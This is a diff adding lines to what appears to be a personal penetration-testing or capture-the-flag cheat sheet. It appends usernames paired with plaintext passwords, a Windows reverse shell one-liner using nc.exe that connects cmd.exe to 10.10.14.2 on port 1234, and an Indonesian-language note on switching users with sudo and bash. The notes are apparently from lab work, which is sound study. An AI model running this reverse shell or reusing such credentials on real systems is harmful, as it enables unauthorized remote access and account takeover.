@@ -92,3 +92,13 @@ james:toyota
 baltazar:TheJoker12345!
 frank:STARS5678FORTUNE401 , TractorHeadtorchDeskmat
 margaret:Welcome1!2@3#
+julian:manchesterunited
+
+admin:admin
+ben:Welcometomyblog
+
+REVERSE SHELL WINDOWS USING NC.EXE
+nc.exe -e cmd.exe 10.10.14.2 1234
+
+/bin/bash bisa buat pindah user
+sudo -u julian /bin/bash
